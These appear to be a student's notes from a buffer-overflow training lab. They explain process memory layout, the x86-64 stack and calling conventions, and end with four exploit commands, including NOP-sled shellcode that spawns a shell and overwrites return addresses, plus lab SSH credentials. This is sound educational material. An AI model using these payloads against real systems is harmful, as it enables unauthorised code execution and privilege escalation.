# Buffer_Overflows 

> VOiD | Friday 06 August 2021 07:18:26 PM IST

My IP : 10.17.6.109
Target IP : 


# Access
SSH
Username: user1
Password: user1password


# Process Layout
```
When a program runs on a machine, the computer runs the program as a process. Current computer architecture allows multiple processes to be run concurrently(at the same time by a computer). While these processes may appear to run at the same time, the computer actually switches between the processes very quickly and makes it look like they are running at the same time. Switching between processes is called a context switch. Since each process may need different information to run(e.g. The current instruction to execute), the operating system has to keep track of all the information in a process. The memory in the process is organised sequentially and has the following layout: 




User stack contains the information required to run the program. This information would include the current program counter, saved registers and more information(we will go into detail in the next section). The section after the user stack is unused memory and it is used in case the stack grows(downwards)

Shared library regions are used to either statically/dynamically link libraries that are used by the program

The heap increases and decreases dynamically depending on whether a program dynamically assigns memory. Notice there is a section that is unassigned above the heap which is used in the event that the size of the heap increases.

The program code and data stores the program executable and initialised variables.

```

# x86-64 Procedures

```

A program would usually comprise of multiple functions and there needs to be a way of tracking which function has been called, and which data is passed from one function to another. The stack is a region of contiguous memory addresses and it is used to make it easy to transfer control and data between functions. The top of the stack is at the lowest memory address and the stack grows towards lower memory addresses. The most common operations of the stack are:


Pushing: used to add data onto the stack

Popping: used to remove data from the stack


push var

This is the assembly instruction to push a value onto the stack. It does the following:

Uses var or value stored in memory location of var



Decrements the stack pointer(known as rsp) by 8

Writes above value to new location of rsp, which is now the top of the stack



pop var

This is an assembly instruction to read a value and pop it off the stack. It does the following:

Reads the value at the address given by the stack pointer

Stack Bottom()


Stack Top(memory location 0x0)(rsp points here)

Increment the stack pointer by 8

Store the value that was read from rsp into var



It’s important to note that the memory does not change when popping values of the stack - it is only the value of the stack pointer that changes! 

Each compiled program may include multiple functions, where each function would need to store local variables, arguments passed to the function and more. To make this easy to manage, each function has its own separate stack frame, where each new stack frame is allocated when a function is called, and deallocated when the function is complete. 



This is easily explained using an example. Look at the two functions:

int add(int a, int b){

   int new = a + b;

   return new;

}



int calc(int a, int b){

   int final = add(a, b);

   return final;

}



calc(4, 5)

```

# Procedures Continued
```


The explanation assumes that the current point of execution is inside the calc function. In this case calc is known as the caller function and add is known as the callee function. The following presents the assembly code inside the calc function







The add function is invoked using the call operand in assembly, in this case callq sym.add. The call operand can either take a label as an argument(e.g. A function name), or it can take a memory address as an offset to the location of the start of the function in the form of call *value. Once the add function is invoked(and after it is completed), the program would need to know what point to continue in the program. To do this, the computer pushes the address of the next instruction onto the stack, in this case the address of the instruction on the line that contains movl %eax, local_4h. After this, the program would allocate a stack frame for the new function, change the current instruction pointer to the first instruction in the function, change the stack pointer(rsp) to the top of the stack, and change the frame pointer(rbp) to point to the start of the new frame. 






Once the function is finished executing, it will call the return instruction(retq). This instruction will pop the value of the return address of the stack, deallocate the stack frame for the add function, change the instruction pointer to the value of the return address, change the stack pointer(rsp) to the top of the stack and change the frame pointer(rbp) to the stack frame of calc.






Now that we’ve understood how control is transferred through functions, let’s look at how data is transferred. 

In the above example, we save that functions take arguments. The calc function takes 2 arguments(a and b). Upto 6 arguments for functions can be stored in the following registers:

rdi

rsi

rdx

rcx

r8

r9

Note: rax is a special register that stores the return values of the functions(if any).

If a function has anymore arguments, these arguments would be stored on the functions stack frame. 

We can now see that a caller function may save values in their registers, but what happens if a callee function also wants to save values in the registers? To ensure the values are not overwritten, the callee values first save the values of the registers on their stack frame, use the registers and then load the values back into the registers. The caller function can also save values on the caller function frame to prevent the values from being overwritten. Here are some rules around which registers are caller and callee saved:

rax is caller saved

rdi, rsi, rdx, rcx r8 and r9 are called saved(and they are usually arguments for functions)

r10, r11 are caller saved

rbx, r12, r13, r14 are callee saved 

rbp is also callee saved(and can be optionally used as a frame pointer)

rsp is callee saved

So far, this is a more thorough example of the run time stack:

```

Overflow-1
```bash
python -c 'print "A"*15' | ./Overflow-1

```

Overflow-2
```bash
0x00400567    1 27           sym.special
python -c 'print "A"*14 + "\x67\x05\x40\x00"' | ./func-pointer

```

Overflow-3 
```bash
shellcode = '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'

in gdb we can use
$(python -c "print('A'*158)")

./buffer-overflow $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*8 + '\x88\xe2\xff\xff\xff\x7f')")

cat secret.txt 
omgyoudidthissocool!!

```


Overflow-4
```bash
/buffer-overflow-2 $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\x68\xe2\xff\xff\xff\x7f')")


```

